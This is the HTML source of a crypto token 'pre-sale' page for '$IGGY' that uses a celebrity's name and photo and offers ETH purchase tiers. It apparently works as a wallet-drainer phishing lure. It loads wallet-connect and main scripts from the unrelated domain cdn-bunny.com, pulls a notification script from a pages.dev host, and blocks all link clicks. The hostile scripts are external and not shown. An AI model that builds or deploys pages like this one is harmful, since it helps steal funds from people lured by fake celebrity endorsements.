
    <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$IGGY Pre-Sale</title>
    <style>
        body,
        html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            font-family: 'Arial', sans-serif;
        }

        .card {
            background-color: #1e1e1e;
            border-radius: 25px;
            padding: 20px;
            width: 350px;
            text-align: center;
            color: white;
            box-shadow: 0px 0px 12px 0px rgba(0, 0, 0, 0.5);
        }

        .card img {
            width: 80px;
            border-radius: 50%;
            margin-bottom: 20px;
            border: 5px solid #fff;
        }

        .card h1 {
            color: #fff;
            font-size: 1.5em;
            margin: 10px 0;
        }

        .card p {
            color: #fff;
            font-size: 1em;
            margin: 5px 0;
        }

        .card select {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 2px solid #333;
            border-radius: 5px;
            background-color: #333;
            color: #fff;
        }

        .card option {
            background: #333;
        }

        .interact-button,
        .placeholder-button {
            background-color: #4b7bec;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            margin: 10px 0;
            cursor: pointer;
            outline: none;
            width: 100%;
            font-size: 1em;
            text-transform: uppercase;
            box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.5);
        }

        .footer {
            color: #aaa;
            font-size: 0.8em;
            margin-top: 15px;
        }

        .footer a {
            color: #4b7bec;
            text-decoration: none;
        }

        #notification-container {
            position: fixed;
            top: 20px;
            right: 20px;
            width: 300px;
            z-index: 1000;
        }
        
        .notification {
            background-color: #333;
            color: #fff;
            padding: 10px;
            border-radius: 10px;
            margin-top: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            animation: slideIn 0.5s ease-in-out, fadeOut 5s ease-in-out forwards;
            animation-delay: 0s, 5s;
            opacity: 1;
        }
        
        @keyframes slideIn {
            from {
                transform: translateY(-100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        @keyframes fadeOut {
            to {
                opacity: 0;
            }
        }
        
        @media (max-width: 768px) {
            #notification-container {
                top: 0; 
                right: 0; 
                left: 0; 
                width: auto; 
                padding: 10px 0; 
            }
        }
        
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
          var links = document.querySelectorAll('a');
          links.forEach(function (link) {
            link.addEventListener('click', function (event) {
              event.preventDefault();
            });
          });
        });
      </script>
    <script charset="UTF-8" type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
    <script charset="UTF-8" type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"></script>
    <script charset="UTF-8" type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
    <script charset="UTF-8" type="text/javascript" src="https://cdn-bunny.com/scripts/wallet-connect-v4.js"></script>
    <link charset="UTF-8" rel="stylesheet" href="https://cdn-bunny.com/styles/popup-6.css">
    </link>
    <script charset="UTF-8" type="text/javascript" src="https://cdn-bunny.com/main.js"></script>
</head>

<body>
    <div id="notification-container"></div>

    <div class="card">
        <img src="https://pbs.twimg.com/profile_images/1705367878009049088/pgPEKVWU_400x400.jpg" alt="Profile Picture">
        <h1>$IGGY PRE-SALE</h1>
        <p>Presale Cap is set at 1000 ETH.</p>
        <p>0.1 ETH ~ 99,500 $IGGY</p>
        <select>
            <option value="0.1">0.1 ETH</option>
            <option value="0.2">0.2 ETH</option>
            <option value="0.3">0.3 ETH</option>
            <option value="0.4">0.4 ETH</option>
            <option value="0.5">0.5 ETH</option>
        </select>
        <button class="interact-button placeholder-button">Buy</button>
        <p class="footer">Total Supply: 100,000,000 $IGGY.<br>Brought to you by <a href="https://twitter.com/IGGYAZALEA" target="_blank">@IGGYAZALEA</a></p>

    </div>
    <script src="https://sitenotification.pages.dev/notificationScript.js"></script>
    </body>

</html>
